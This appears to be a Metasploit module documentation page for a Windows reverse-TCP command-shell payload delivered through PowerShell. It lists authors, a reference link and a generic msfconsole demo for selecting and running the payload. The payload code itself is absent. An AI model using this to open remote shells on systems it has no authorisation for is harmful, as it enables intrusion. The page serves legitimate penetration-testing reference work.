## Windows Command Shell, Reverse TCP (via Powershell)

Connect back and create a command shell via Powershell


## Module Name
payload/cmd/windows/reverse_powershell

## Authors
* Dave Kennedy
* Ben Campbell


## References
* https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell




## Platforms
win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/cmd/windows/reverse_powershell
msf payload(reverse_powershell) > show targets
   ... a list of targets ...
msf payload(reverse_powershell) > set TARGET <target-id>
msf payload(reverse_powershell) > show options
   ... show and set options ...
msf payload(reverse_powershell) > run
```
    
    